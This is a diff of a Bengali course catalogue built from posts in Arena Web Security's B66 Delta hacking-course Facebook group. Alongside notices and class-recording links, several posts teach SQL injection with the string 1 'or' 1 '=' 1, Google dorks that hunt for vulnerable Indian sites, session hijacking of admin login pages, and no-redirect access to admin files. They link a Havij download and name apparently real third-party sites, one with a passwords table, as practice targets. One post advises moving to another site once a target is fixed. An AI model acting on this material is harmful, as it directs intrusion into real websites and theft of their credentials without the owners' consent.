@@ -1,12 +1,10 @@
-# Arena B66 Delta · Preserved course catalogue
+# Arena B66 Delta — Public Course Catalogue
 
-Updated: 2026-10-07. This catalogue preserves collected post text independently of Facebook. Unknown post dates are explicitly marked; the full-group completeness audit is still open.
+Updated: 2026-10-08. Archive serials are preserved. Private meeting access, restricted portal credentials and individual exam results are excluded.
 
-## entry-15 · এরিনা ওয়েব সিকিউরিটি CEHF এর কোর্সে রেজিস্ট্রেশনকৃত সবাইকে স্বাগতম।
+## এরিনা ওয়েব সিকিউরিটি CEHF এর কোর্সে রেজিস্ট্রেশনকৃত সবাইকে স্বাগতম।
 
-Category: information | Date: 2026-07-12
-
-### Preserved post text
+Date: 2026-07-12 · Category: information · ID: entry-15
 
 এরিনা ওয়েব সিকিউরিটি CEHF এর কোর্সে রেজিস্ট্রেশনকৃত সবাইকে স্বাগতম।
 এখানে আমরা সাইবার সিকিউরিটি বিষয়ক বিভিন্ন প্রশ্ন এবং ক্লাস পরবর্তি যে কোন সাহায্য সহযোগিতা নিয়ে আলোচনা করবো।
@@ -30,13 +28,11 @@ Category: information | Date: 2026-07-12
 বিশেষ প্রয়োজনে info@arenawebsecurity.net এখানে ইমেইল করা যেতে পারে।
 ○ যদি উপরের রুলস গুলো মেনে চলতে পারেন তাহলে আগামী চার মাসের মধ্যেই আমরা একঝাক মেধাবী সিকিউরিটি স্পেশালিষ্ট পেতে যাচ্ছি যারা নিজেদের ক্যারিয়ার সহ দেশের জন্য ও অনেক অবদান রাখতে পারবেন।
 
-Original source: https://www.facebook.com/groups/awsb66delta/posts/1598190601883529
+- [Source post](https://www.facebook.com/groups/awsb66delta/posts/1598190601883529)
 
-## entry-16 · হোমওয়ার্ক প্যানেল ব্যবহারের নির্দেশনা
+## হোমওয়ার্ক প্যানেল ব্যবহারের নির্দেশনা
 
-Category: classes | Date: 2026-07-17
-
-### Preserved post text
+Date: 2026-07-17 · Category: classes · ID: entry-16
 
 আসসালামু আলাইকুম
 এরিনা ওয়েব সিকিউরিটি ৬৬ তম ডেল্টা ব্যাচের সকলকে জানাই স্বাগতম। আগামী রবিবার রাত ৯ টা ৩০ মিনিটে আপনাদের ওরিয়েন্টেশন ক্লাস আনুষ্ঠানিকভাবে অনুষ্ঠিত হবে। তাই সবাইকে যথাসময়ে ফেসবুক গ্রুপে ফলোআপ রাখার জন্য বলা হচ্ছে। এর পাশাপাশি
@@ -44,15 +40,12 @@ Category: classes | Date: 2026-07-17
 https://drive.google.com/file/d/1vYQORaAT5jfQJY9BCYIR-sDQR671CzsD/view?usp=sharing
 0:00 / 14:38
 
-Verified video: https://youtu.be/oka_NMsPt-Y
+- [Resource](https://drive.google.com/file/d/1vYQORaAT5jfQJY9BCYIR-sDQR671CzsD/view)
+- [Source post](https://www.facebook.com/groups/awsb66delta/posts/1601798241522765)
 
-Original source: https://www.facebook.com/groups/awsb66delta/posts/1601798241522765
+## অরিয়েন্টেশন ক্লাস শুরু হয়ে গেছে, সবাই শুধুমাত্র এই লাইভেই জয়েন করুন। আমি পর্যায়ক্রমে সকল দিক নির্…
 
-## entry-14 · অরিয়েন্টেশন ক্লাস শুরু হয়ে গেছে, সবাই শুধুমাত্র এই লাইভেই জয়েন করুন। আমি পর্যায়ক্রমে সকল দিক নির্…
-
-Category: information | Date: 2026-07-19
-
-### Preserved post text
+Date: 2026-07-19 · Category: information · ID: entry-14
 
 অরিয়েন্টেশন ক্লাস শুরু হয়ে গেছে, সবাই শুধুমাত্র এই লাইভেই জয়েন করুন। আমি পর্যায়ক্রমে সকল দিক নির্দেশনা দিয়ে দিচ্ছি। ধন্যবাদ।
 posted to
@@ -60,26 +53,24 @@ Admin
 ·
 Orientation Class: B66 Delta
 
-Original source: https://www.facebook.com/groups/awsb66delta/posts/1604083781294211
+- [Resource](https://www.facebook.com/groups/awsb66delta/posts/1604083781294211/)
+- [Resource](https://www.facebook.com/groups/awsb66delta/)
+- [Source post](https://www.facebook.com/groups/awsb66delta/posts/1604083781294211)
 
-## entry-20 · Orientation — কোর্স পরিচিতি
+## Class 1 — Orientation — কোর্স পরিচিতি
 
-Category: recordings | Date: 2026-07-19
-
-### Preserved post text
+Date: 2026-07-19 · Category: recordings · ID: entry-20
 
 ক্লাস রেকর্ড
 ১৯/০৭/২০২৬
 drive.google.com
 Orientation class.mp4
 
-Verified video: https://youtu.be/wf2Q5Z6bNlE
+- [Resource](https://drive.google.com/file/d/14EMX0Zu6BxqhlA8RAyqb3S7RChiKVB5z/view)
 
-## entry-13 · INFORMATIONAL POST -01
+## INFORMATIONAL POST -01
 
-Category: information | Date: 2026-07-20
-
-### Preserved post text
+Date: 2026-07-20 · Category: information · ID: entry-13
 
 INFORMATIONAL POST -01
 1 'or' 1 '=' 1 দিয়ে Site Access হলো কেন?
@@ -131,13 +122,12 @@ Password: উপরের পাসওয়ার্ড থেকে দিয়ে 
 কিছুদিন পর এমনিতেই বুঝে যাবেন (স্পেশালী ম্যানুয়্যাল এসকিউএল এর ক্লাসের পর), তারপরও না বুঝলে তখন একটি ভিডিও করে দিবনে।
 তারপরও কারো আগ্রহ থাকলে ঘুরে আসুন ডাব্লিউ ‍থ্রি স্কুল থেকে- https://www.w3schools.com/sql/sql_injection.asp
 
-Original source: https://www.facebook.com/groups/awsb66delta/posts/1604208154615107
+- [Resource](https://www.w3schools.com/sql/sql_injection.asp)
+- [Source post](https://www.facebook.com/groups/awsb66delta/posts/1604208154615107)
 
-## entry-25 · আসুন, জেনে নেই -১
+## আসুন, জেনে নেই -১
 
-Category: information | Date: 2026-07-20
-
-### Preserved post text
+Date: 2026-07-20 · Category: information · ID: entry-25
 
 আসুন, জেনে নেই -১
 ভালনেরাবিলিটি (Vulnerability) কি?
@@ -174,13 +164,11 @@ intitle: “login page” site:.in
 তবে গুগল ডর্ক হলো হ্যাকিংয়ের প্রাথমিক ধাপ (হ্যাক করার জন্য সাইট বা লিংক খুঁজে বের করা)।
 ধন্যবাদ।
 
-Original source: https://www.facebook.com/groups/awsb66delta/posts/1604210557948200
+- [Source post](https://www.facebook.com/groups/awsb66delta/posts/1604210557948200)
 
-## entry-29 · মঙ্গলবারের সাপোর্ট সম্পর্কে গুরুত্বপূর্ণ আপডেট!
+## মঙ্গলবারের সাপোর্ট সম্পর্কে গুরুত্বপূর্ণ আপডেট!
 
-Category: information | Date: 2026-07-21
-
-### Preserved post text
+Date: 2026-07-21 · Category: information · ID: entry-29
 
 মঙ্গলবারের সাপোর্ট সম্পর্কে গুরুত্বপূর্ণ আপডেট!
 কি অবস্থা সবার কেমন আছেন?
@@ -194,18 +182,16 @@ Meet-এ যোগদানের তথ্য:
 রাত ১০ থেকে মধ্য রাত ২ টা পর্যন্ত
 লিঙ্ক:
 To join the video meeting, click this link:
-Otherwise, to join by phone, dial +1 316-550-0070 and enter this PIN: 847 826 124#
+[মিটিং ডায়াল নম্বর ও PIN প্রকাশ করা হয়নি]
 কিভাবে সাহায্য পাবেন:
 আপনি চাইলে মঙ্গলবার সারাদিন সাপোর্ট পোস্টের কমেন্টের মাধ্যমে যোগাযোগ করে আপনার প্রবলেমের বিষয় জানিয়ে সমস্যার সমাধান নিতে পারেন অথবা উল্লেখিত নির্দিষ্ট সময়ের মধ্যে মিটিংয়ে জয়েন করে সমস্যার সমাধান নিতে পারবেন।
 ধন্যবাদ।
 
-Original source: https://www.facebook.com/groups/awsb66delta/posts/1604959244539998
+- [Source post](https://www.facebook.com/groups/awsb66delta/posts/1604959244539998)
 
-## entry-12 · সবাই ক্লাসে চলে আসুন।
+## সবাই ক্লাসে চলে আসুন।
 
-Category: notices | Date: 2026-07-24
-
-### Preserved post text
+Date: 2026-07-24 · Category: notices · ID: entry-12
 
 সবাই ক্লাসে চলে আসুন।
 posted to
@@ -213,19 +199,19 @@ Admin
 ·
 Cyber Safety, SQL Injection by tools
 
-Original source: https://www.facebook.com/groups/awsb66delta/posts/1608140980888491
+- [Resource](https://www.facebook.com/groups/awsb66delta/posts/1608140980888491/)
+- [Resource](https://www.facebook.com/groups/awsb66delta/)
+- [Source post](https://www.facebook.com/groups/awsb66delta/posts/1608140980888491)
 
-## entry-39 · First class: Cyber Safety, SQL Injection by tools
+## First class: Cyber Safety, SQL Injection by tools
 
-Category: documents | Date: 2026-07-24
-
-### Preserved post text
+Date: 2026-07-24 · Category: documents · ID: entry-39
 
 ডিরেক্ট ক্লাস রিসোর্স লিংক
 docs.google.com
 First class: Cyber Safety, SQL Injection by tools
 
-### Preserved note
+### Notes
 
 First class: Cyber Safety, SQL Injection by tools
 Batch: 66, Delta
@@ -297,7 +283,7 @@ Sec 2 Official CW:
 http://www.siemerc.com.br/site/evento.php?id=2
 
 
-CW Submit: https://toolkit.arenawebsecurity.net/practice/play.php?play=45flnu
+CW Submit: [সীমিত প্রবেশাধিকার]
 
 
 
@@ -307,26 +293,23 @@ CW Submit: https://toolkit.arenawebsecurity.net/practice/play.php?play=45flnu
 Candidato (Table) - Cidade (Passwords)
 ===================================================
 
-Original source: https://www.facebook.com/groups/awsb66delta/posts/1608143074221615
+- [Resource](https://docs.google.com/document/d/10FjEY5eyXUc54sUamu2-uj-8m5N03Cuwf-PKuDVimcM/edit?tab=t.0)
+- [Source post](https://www.facebook.com/groups/awsb66delta/posts/1608143074221615)
 
-## entry-40 · Cyber Safety ও SQL Injection by Tools
+## Class 2 — Cyber Safety ও SQL Injection by Tools
 
-Category: recordings | Date: 2026-07-24
-
-### Preserved post text
+Date: 2026-07-24 · Category: recordings · ID: entry-40
 
 ক্লাস রেকর্ড
 ২৪/০৭/২০২৬
 drive.google.com
 Class record.mp4
 
-Verified video: https://youtu.be/e-PewC8sDlk
+- [Resource](https://drive.google.com/file/d/1dqvQLxWdK2CCLikaGO-OMykc6lpuZZmH/view)
 
-## entry-11 · আসুন জেনে নেই - ২
+## আসুন জেনে নেই - ২
 
-Category: information | Date: 2026-07-25
-
-### Preserved post text
+Date: 2026-07-25 · Category: information · ID: entry-11
 
 আসুন জেনে নেই - ২
 (SQL Injection কেন করি??)
@@ -353,40 +336,34 @@ DBMS (ডাটাবেজম্যানেজমেন্ট সিস্ট�
 এখন বুঝতে পারলেন তো ডাটাবেস কেন এতো গুরুত্বপূর্ণ?
 আর সেজন্যই তো যে কোন হ্যাকারের প্রাথমিক টার্গেট থাকে কোন সাইটের ডাটাবেস। ডাটাবেস থেকে তথ্য বের করার জন্য(মেইনলি এডমিন ইউজারের নাম, পাসওয়ার্ড, মেইল..) আমরা এস কিউ এল ইঞ্জেকশান ব্যাবহার করি।
 
-Original source: https://www.facebook.com/groups/awsb66delta/posts/1608246744211248
+- [Source post](https://www.facebook.com/groups/awsb66delta/posts/1608246744211248)
 
-## entry-10 · অফিশিয়াল যে কোন নোটিশ পেতে Arena Web Security পেজে লাইক দিয়ে রাখুন।
+## অফিশিয়াল যে কোন নোটিশ পেতে Arena Web Security পেজে লাইক দিয়ে রাখুন।
 
-Category: notices | Date: 2026-07-26
-
-### Preserved post text
+Date: 2026-07-26 · Category: notices · ID: entry-10
 
 অফিশিয়াল যে কোন নোটিশ পেতে Arena Web Security পেজে লাইক দিয়ে রাখুন।
 আর অবশ্যই রিভিউ অপশনে গিয়ে আপনার মতামত জানাতে ভূলবেন না। বাংলা কিংবা ইংরেজি, যে কোন একভাবে রিভিউ দিলেই হবে।
 https://www.facebook.com/ArenaBangladesh/
 N.B: রিভিউ লিংক সরাসরি ওপেন না হলে পেজে গিয়ে recommendation এ ক্লিক করলেই রিভিউ দিতে পারবেন।
 
-Original source: https://www.facebook.com/groups/awsb66delta/posts/1609893780713211
+- [Resource](https://www.facebook.com/ArenaBangladesh/reviews)
+- [Source post](https://www.facebook.com/groups/awsb66delta/posts/1609893780713211)
 
-## entry-46 · OSINT — Open Source Intelligence
+## Class 3 — OSINT — Open Source Intelligence
 
-Category: recordings | Date: 2026-07-26
-
-### Preserved post text
+Date: 2026-07-26 · Category: recordings · ID: entry-46
 
 ক্লাস রেকর্ড
 ২৬/০৭/২০২৬
 1krgJQXBlYIQ6jv8RcXAp-LoVVgEc-GSS
 
-Verified video: https://youtu.be/ISheHt-js2A
+- [Resource](https://drive.google.com/file/d/1krgJQXBlYIQ6jv8RcXAp-LoVVgEc-GSS/view?usp=sharing)
+- [Source post](https://www.facebook.com/groups/awsb66delta/posts/1609919597377296)
 
-Original source: https://www.facebook.com/groups/awsb66delta/posts/1609919597377296
+## আসুন গুগল ডর্ক সম্পর্কে একটু জেনে নেই!!
 
-## entry-9 · আসুন গুগল ডর্ক সম্পর্কে একটু জেনে নেই!!
-
-Category: information | Date: 2026-07-27
-
-### Preserved post text
+Date: 2026-07-27 · Category: information · ID: entry-9
 
 আসুন গুগল ডর্ক সম্পর্কে একটু জেনে নেই!!
 গুগল ডর্ক (Google Dork) কী?
@@ -413,13 +390,11 @@ URL-এ নির্দিষ্ট শব্দ বা স্ট্রিং �
 অনেকটা একই রকম আমরা বুঝতেই পারছি ( ইউ আর এল এর ভিতর php?id= আইডি এবং প্যারামিটার থাকবে এমন সব ওয়েবসাইট আমার সামনে আসবে এবং তা অবশ্যই ইন্ডিয়ান হতে হবে ) আপনি চাইলে এখানে .in এর পরিবর্তে টার্গেট ওয়েবসাইটের ইউআরএল দিয়েও খুঁজে দেখতে পারেন যে ওই ওয়েবসাইটের আইডি প্যারামিটার আছে কিনা। উদাহরণস্বরূপ:
 এখন এতোটুকু যদি সত্যিই বুঝে থাকেন তাহলে মন দিয়ে প্র্যাকটিস করুন এবং আপনার ইচ্ছা অনুযায়ী গুগল ডর্ক মডিফাই করতে শিখতে থাকুন কোথাও যদি বুঝতে অসুবিধা হয় অবশ্যই কমেন্টে আমাকে জানাবেন ধন্যবাদ।
 
-Original source: https://www.facebook.com/groups/awsb66delta/posts/1609866550715934
+- [Source post](https://www.facebook.com/groups/awsb66delta/posts/1609866550715934)
 
-## entry-47 · হাভিজ এর পোর্টেবল ভার্সান।
+## হাভিজ এর পোর্টেবল ভার্সান।
 
-Category: tools | Date: 2026-07-27
-
-### Preserved post text
+Date: 2026-07-27 · Category: tools · ID: entry-47
 
 হাভিজ এর পোর্টেবল ভার্সান।
 প্রথমেই বলে নেই অতি উৎসাহী হয়ে ইউ-টিউব এর বা গুগল থেকে খুঁজে খুঁজে হাভিজ বা হ্যাকিং রিলেটেড কোন টুলস্‌, সফ্টওয়্যার ডাউনলোড করবেন না। র‌্যানসামওয়ারে অথবা কি-লগিংএর স্বিকার হতে পারেন।
@@ -436,13 +411,12 @@ Category: tools | Date: 2026-07-27
 drive.google.com
 Havij_Pro.zip
 
-Original source: https://www.facebook.com/groups/awsb66delta/posts/1609865664049356
+- [Havij_Pro.zip](https://drive.google.com/file/d/1m0Q2mkGr_JqBAB6TWStJ1trRDDAIUjwF/view)
+- [Source post](https://www.facebook.com/groups/awsb66delta/posts/1609865664049356)
 
-## entry-8 · আমাদের পরবর্তী ক্লাসের জন্য Cyberfox টুলস টি সেটাপ করে নিন
+## আমাদের পরবর্তী ক্লাসের জন্য Cyberfox টুলস টি সেটাপ করে নিন
 
-Category: tools | Date: 2026-07-28
-
-### Preserved post text
+Date: 2026-07-31 · Category: tools · ID: entry-8
 
 আমাদের পরবর্তী ক্লাসের জন্য Cyberfox টুলস টি সেটাপ করে নিন
 ।
@@ -454,13 +428,14 @@ VIDEO:
 drive.google.com
 cyberfox.mkv
 
-Original source: https://www.facebook.com/groups/awsb66delta/posts/1610713203964602
+- [Cyber_Fox.zip](https://drive.google.com/file/d/1EwXd3srfDA_bVfTPOfp_e5CXve2h2D2c/view)
+- [Resource](https://drive.google.com/file/d/1NNwOQSycjxYaQGynnvbUd7qGnb4Jp2UR/view?usp=drive_link)
+- [Resource](https://drive.google.com/file/d/10huk7zPRgzq-ip8nD-SE8_EpBtlsgAvb/view?usp=drive_link)
+- [Source post](https://www.facebook.com/groups/awsb66delta/posts/1610713203964602)
 
-## entry-49 · মঙ্গলবারের সাপোর্ট সম্পর্কে গুরুত্বপূর্ণ আপডেট!
+## মঙ্গলবারের সাপোর্ট সম্পর্কে গুরুত্বপূর্ণ আপডেট!
 
-Category: information | Date: 2026-07-28
-
-### Preserved post text
+Date: 2026-07-28 · Category: information · ID: entry-49
 
 মঙ্গলবারের সাপোর্ট সম্পর্কে গুরুত্বপূর্ণ আপডেট!
 কি অবস্থা সবার কেমন আছেন?
@@ -474,37 +449,33 @@ Meet-এ যোগদানের তথ্য:
 রাত ১০ থেকে মধ্য রাত ২ টা পর্যন্ত
 লিঙ্ক:
 To join the video meeting, click this link:
-Otherwise, to join by phone, dial +1 316-550-0070 and enter this PIN: 847 826 124#
+[মিটিং ডায়াল নম্বর ও PIN প্রকাশ করা হয়নি]
 কিভাবে সাহায্য পাবেন:
 আপনি চাইলে মঙ্গলবার সারাদিন সাপোর্ট পোস্টের কমেন্টের মাধ্যমে যোগাযোগ করে আপনার প্রবলেমের বিষয় জানিয়ে সমস্যার সমাধান নিতে পারেন অথবা উল্লেখিত নির্দিষ্ট সময়ের মধ্যে মিটিংয়ে জয়েন করে সমস্যার সমাধান নিতে পারবেন।
 ধন্যবাদ।
 meet.google.com
 
-Original source: https://www.facebook.com/groups/awsb66delta/posts/1610715763964346
+- [Source post](https://www.facebook.com/groups/awsb66delta/posts/1610715763964346)
 
-## entry-6 · মিড এক্সামের জন্য শুভ কামনা রইলো। কোন প্রশ্ন থাকলে এই পোষ্ট থেকে সহায়তা নিয়ে নিতে পারেন। ধন্যবাদ।
+## মিড এক্সামের জন্য শুভ কামনা রইলো। কোন প্রশ্ন থাকলে এই পোষ্ট থেকে সহায়তা নিয়ে নিতে পারেন। ধন্যবাদ।
 
-Category: notices | Date: 2026-07-31
-
-### Preserved post text
+Date: 2026-07-31 · Category: notices · ID: entry-6
 
 মিড এক্সামের জন্য শুভ কামনা রইলো। কোন প্রশ্ন থাকলে এই পোষ্ট থেকে সহায়তা নিয়ে নিতে পারেন। ধন্যবাদ।
 আর হ্যা, এরিনা ওয়েব সিকিউরিটি পেজে লাইক এন্ড রিভিউ মাস্ট।
 https://www.facebook.com/ArenaBangladesh
 
-Original source: https://www.facebook.com/groups/awsb66delta/posts/1614226516946604
+- [Source post](https://www.facebook.com/groups/awsb66delta/posts/1614226516946604)
 
-## entry-7 · Session hijacking / Blocking, Mid Exam prep - b66 Delta
+## Session hijacking / Blocking, Mid Exam prep - b66 Delta
 
-Category: documents | Date: 2026-07-31
-
-### Preserved post text
+Date: 2026-07-31 · Category: documents · ID: entry-7
 
 ডিরেক্ট ক্লাস রিসোর্স লিংক
 docs.google.com
 Session hijacking / Blocking, Mid Exam prep - b66 Delta
 
-### Preserved note
+### Notes
 
 Admission dept hotline: +8801310333444 (WhatsApp)
 Diploma module: https://drive.google.com/file/d/1zUvuT2YHsbMWECLM0eCmvTh3nMh1GM2g/view
@@ -567,29 +538,25 @@ Link: https://sucic.org/admin/dashboard.php
 
 
 
-CW: https://toolkit.arenawebsecurity.net/practice/play.php?play=elzq14
+CW: [সীমিত প্রবেশাধিকার]
 
-Original source: https://www.facebook.com/groups/awsb66delta/posts/1614143273621595
+- [Resource](https://docs.google.com/document/d/1-GJQv075oX67PWxaSWyKnsUMWyLMWbtuZQfBB37UAwU/edit?tab=t.0)
+- [Source post](https://www.facebook.com/groups/awsb66delta/posts/1614143273621595)
 
-## entry-58 · Session hijacking, blocking ও Mid Exam প্রস্তুতি
+## Class 4 — Session hijacking, blocking ও Mid Exam প্রস্তুতি
 
-Category: recordings | Date: 2026-07-31
-
-### Preserved post text
+Date: 2026-07-31 · Category: recordings · ID: entry-58
 
 ক্লাস রেকর্ড
 ৩১/০৭/২০২৬
 1QHYP0xJtjfBVC4zD2GmmQ6R1jj6es76Q
 
-Verified video: https://youtu.be/0fk1ksVPvQ0
+- [Resource](https://drive.google.com/file/d/1QHYP0xJtjfBVC4zD2GmmQ6R1jj6es76Q/view?usp=sharing)
+- [Source post](https://www.facebook.com/groups/awsb66delta/posts/1614267503609172)
 
-Original source: https://www.facebook.com/groups/awsb66delta/posts/1614267503609172
+## INFORMATIONAL POST - 02
 
-## entry-4 · INFORMATIONAL POST - 02
-
-Category: information | Date: 2026-08-01
-
-### Preserved post text
+Date: 2026-08-01 · Category: information · ID: entry-4
 
 INFORMATIONAL POST - 02
 NO REDIRECT এর সামারী।
@@ -635,13 +602,11 @@ site name(website name. net or .com or org or com.in or....) এর পর /admi
 ৪) এডমিনের কাজ করার জন্য কিছু ফাইল( যেমন addDate.php, addFestival.php,addLedger.php, adminHome.php,editInvoice.php, ইত্যাদি) যা আমরা ওয়েব পেইজে দেখতে পাইনা।
 আশাকরি আর বিস্তারিত কিছু লেখার প্রয়োজন হবে না।
 
-Original source: https://www.facebook.com/groups/awsb66delta/posts/1614256456943610
+- [Source post](https://www.facebook.com/groups/awsb66delta/posts/1614256456943610)
 
-## entry-5 · আসুন জেনে নেই- ৪
+## আসুন জেনে নেই- ৪
 
-Category: information | Date: 2026-08-01
-
-### Preserved post text
+Date: 2026-08-01 · Category: information · ID: entry-5
 
 আসুন জেনে নেই- ৪
 (Session Hijacking)
@@ -692,23 +657,29 @@ inurl: admin/login.php site:.in
 তখন আপনাকে দেখতে হবে ঐ সাইটে আর অন্য কোন লিংক ওপেন আছে কিনা, সেগুলোতে ট্রাই করতে হবে। আর যদি ঐ সাইটের সব লিংক ই সেইম সাদা স্ক্রিণ আসে, তাহলে ঐ সাইট ফিক্স করা হয়ে গেছে, অন্য সাইট এ ট্রাই করতে হবে।
 ধন্যবাদ।
 
-Original source: https://www.facebook.com/groups/awsb66delta/posts/1614255560277033
+- [Resource](https://arenawebsecurity.net/index.php)
+- [Resource](https://arenawebsecurity.net/about.php)
+- [Resource](https://arenawebsecurity.net/contact.php)
+- [Resource](https://arenawebsecurity.net/admin/editnews.php)
+- [Resource](https://arenawebsecurity.net/admin/editfaq.php)
+- [Resource](https://arenawebsecurity.net/admin/slider/editslider.php)
+- [Resource](https://arenawebsecurity.net/admin/gallery/editgallery.php)
+- [Resource](http://xyz.net/admin/editproduct.php)
+- [Resource](http://xyz.net/admin/login.php)
+- [Resource](http://xyz.net/admin/index.php)
+- [Source post](https://www.facebook.com/groups/awsb66delta/posts/1614255560277033)
 
-## entry-3 · Noredirect Practice
+## Noredirect Practice
 
-Category: information | Date: 2026-08-02
-
-### Preserved post text
+Date: 2026-08-02 · Category: information · ID: entry-3
 
 Noredirect Practice
 
-Original source: https://www.facebook.com/groups/awsb66delta/posts/1614257613610161
+- [Source post](https://www.facebook.com/groups/awsb66delta/posts/1614257613610161)
 
-## entry-62 · INFORMATIONAL POST-03
+## INFORMATIONAL POST-03
 
-Category: information | Date: 2026-08-02
-
-### Preserved post text
+Date: 2026-08-02 · Category: information · ID: entry-62
 
 INFORMATIONAL POST-03
 অনেকেই HTTP & HTTPS নিয়ে ঝামেলায় পড়েছেন, একটু সহজ করে দেই বিষয়টা।।
@@ -738,25 +709,21 @@ http প্রটোকলের মাধ্যমে আপনি আপনা
 তাহলে ক্লাইন্ট থেকে সার্ভারে যে ডাটা যেত সেটা ইনক্রাপ্টেড হয়ে যেত, পথিমধ্যে কেউ পেলেও লাভ নাই, কি সব হিজিবিজি হিজিবিজি হিজিবিজি হিজিবিজি
 বাই দ্য ওয়ে- কোন প্রটোকলেই কেউ প্রেমপত্র পাঠায় না, জাষ্ট আপনাদের বোঝানোর জন্য বল্লাম।।
 
-Original source: https://www.facebook.com/groups/awsb66delta/posts/1614258413610081
+- [Source post](https://www.facebook.com/groups/awsb66delta/posts/1614258413610081)
 
-## entry-64 · Manual SQL Injection
+## Class 5 — Manual SQL Injection
 
-Category: recordings | Date: 2026-08-02
-
-### Preserved post text
+Date: 2026-08-02 · Category: recordings · ID: entry-64
 
 ক্লাস রেকর্ড
 ০২/০৮/২০২৬
 1jM_cYQm5NjRde8Fusb61MX5rYvx9aeys
 
-Verified video: https://youtu.be/h4XYuv--GAI
+- [Resource](https://drive.google.com/file/d/1jM_cYQm5NjRde8Fusb61MX5rYvx9aeys/view?usp=sharing)
 
-## entry-73 · 1st-Mid Exam - Cyber Security & Ethical Hacking
+## 1st-Mid Exam - Cyber Security & Ethical Hacking
 
-Category: notices | Date: 2026-08-07
-
-### Preserved post text
+Date: 2026-08-07 · Category: notices · ID: entry-73
 
 1st-Mid Exam - Cyber Security & Ethical Hacking
 Date: 7th August, 2026
@@ -779,25 +746,23 @@ Diploma Exam Link:
 সবার এক্সামের জন্য শুভ কামনা।
 ধন্যবাদ। @everyone
 
-Original source: https://www.facebook.com/groups/awsb66delta/posts/1620235829679006
+- [Resource](https://forms.gle/QoRHJV6mKhTfJCAY8)
+- [Resource](https://forms.gle/qVZiF2ACHEeTrpBH7)
+- [Source post](https://www.facebook.com/groups/awsb66delta/posts/1620235829679006)
 
-## entry-80 · Cross Site Scripting (XSS)
+## Class 6 — Cross Site Scripting (XSS)
 
-Category: recordings | Date: 2026-08-09
-
-### Preserved post text
+Date: 2026-08-09 · Category: recordings · ID: entry-80
 
 ক্লাস রেকর্ড
 ০৯/০৮/২০২৬
 1UZWV40Eb5VOoX2Me05qVFi-RkZ9_badp
 
-Verified video: https://youtu.be/EaLvBynOYp0
+- [Resource](https://drive.google.com/file/d/1UZWV40Eb5VOoX2Me05qVFi-RkZ9_badp/view?usp=sharing)
 
-## entry-79 · আসুন জেনে নেই-০৫
+## আসুন জেনে নেই-০৫
 
-Category: information | Date: 2026-08-10
-
-### Preserved post text
+Date: 2026-08-10 · Category: information · ID: entry-79
 
 আসুন জেনে নেই-০৫
 ক্রস-সাইট স্ক্রিপ্টিং(XSS)
@@ -827,13 +792,11 @@ Persistent XSS, যেখানে ক্ষতিকর কোডটির উ�
 DOM-based XSS, যেখানে ক্লায়েন্ট সাইড কোডের দুর্বলতার জন্য ক্রস-সাইট স্ক্রিপ্টিং আক্রমণ সংঘটিত হয়।
 এতটুকু যদি সত্যিই বুঝে থাকেন তাহলেই যথেষ্ট।। আশা করি এবার ক্লাস ভিডিটি দেখলে পুরো বিষয় বুঝতে আর কোন সমস্যা হবে না।। বাকীটা ক্লাস ভিডিও দেখে প্র্যাকটিক্যালী শিখে নিন।
 
-Original source: https://www.facebook.com/groups/awsb66delta/posts/1622087516160504
+- [Source post](https://www.facebook.com/groups/awsb66delta/posts/1622087516160504)
 
-## entry-82 · Messenger Group Notice!!
+## Messenger Group Notice!!
 
-Category: notices | Date: 2026-08-10
-
-### Preserved post text
+Date: 2026-08-10 · Category: notices · ID: entry-82
 
 Messenger Group Notice!!
 আপনাদের অফিশিয়ালি মেসেঞ্জার গ্রুপ খোলা হয়েছে। ইতিমধ্যে সবাইকে মেসেঞ্জার গ্রুপটিতে যুক্ত করা হয়েছে। আপনারা আপনাদের মেসেজ রিকোয়েস্ট কিংবা স্প্যাম ফোল্ডার চেক করলেই ব্যাচ এর নাম দেখতে পাবেন। অবশিষ্ট কিছু শিক্ষার্থী যারা এখনো অব্দি অ্যাড হতে পারেননি তাদের জন্য পরবর্তী ইন্সট্রাকশন গ্রুপে পোস্ট করা হবে।
@@ -843,13 +806,11 @@ Messenger Group Notice!!
 একাডেমিক অফিসিয়াল সাপোর্ট ও নোটিশ সংক্রান্ত বিষয়গুলো ফেসবুক গ্রুপেই প্রদান করা হবে, মেসেঞ্জারে নয়।
 আপনাদের সহযোগিতার জন্য ধন্যবাদ।
 
-Original source: https://www.facebook.com/groups/awsb66delta/posts/1622857422750180
+- [Source post](https://www.facebook.com/groups/awsb66delta/posts/1622857422750180)
 
-## entry-85 · Messenger Group Notice!!
+## Messenger Group Notice!!
 
-Category: notices | Date: 2026-08-12
-
-### Preserved post text
+Date: 2026-08-12 · Category: notices · ID: entry-85
 
 Messenger Group Notice!!
 যারা এখনো অব্দি মেসেঞ্জার গ্রুপে যুক্ত হতে পারেননি, তারা নিম্নোক্ত নির্ধারিত ফেসবুক অ্যাকাউন্টে ফ্রেন্ড রিকোয়েস্ট পাঠান এবং ইনবক্সে আপনার ব্যাচের নাম ও ইমেইল ঠিকানা উল্লেখ করে একটি মেসেজ দিন। ছাত্রত্ব যাচাই সম্পন্ন হওয়ার পর অ্যাডমিন সরাসরি আপনাকে মেসেঞ্জার গ্রুপে যুক্ত করে নেবেন।
@@ -861,62 +822,53 @@ Spam
 সেকশন একবার যাচাই করে দেখুন। সেখানে আপনার ব্যাচের মেসেঞ্জার গ্রুপটি দেখতে পাবেন।
 আপনাদের সহযোগিতার জন্য ধন্যবাদ।
 
-Original source: https://www.facebook.com/groups/awsb66delta/posts/1624053222630600
+- [Resource](https://www.facebook.com/qrazam71)
+- [Source post](https://www.facebook.com/groups/awsb66delta/posts/1624053222630600)
 
-## entry-88 · SQLi WAF ও IDS
+## Class 7 — SQLi WAF ও IDS
 
-Category: recordings | Date: 2026-08-14
-
-### Preserved post text
+Date: 2026-08-14 · Category: recordings · ID: entry-88
 
 ক্লাস রেকর্ড
 ১৪/০৮/২০২৬
 10Ugar3fjDL1thCWdCkr6cC-Al0k5BjUz
 
-Verified video: https://youtu.be/4ok4H2OmWsg
+- [Resource](https://drive.google.com/file/d/10Ugar3fjDL1thCWdCkr6cC-Al0k5BjUz/view?usp=sharing)
+- [Source post](https://www.facebook.com/groups/awsb66delta/posts/1626381205731135)
 
-Original source: https://www.facebook.com/groups/awsb66delta/posts/1626381205731135
+## Errorbased SQLi
 
-## entry-87 · Errorbased SQLi
-
-Category: classes | Date: 2026-08-15
-
-### Preserved post text
+Date: 2026-08-15 · Category: classes · ID: entry-87
 
 Errorbased SQLi
 0:00 / 18:45
 
-Original source: https://www.facebook.com/groups/awsb66delta/posts/1626383115730944
+- [Source post](https://www.facebook.com/groups/awsb66delta/posts/1626383115730944)
 
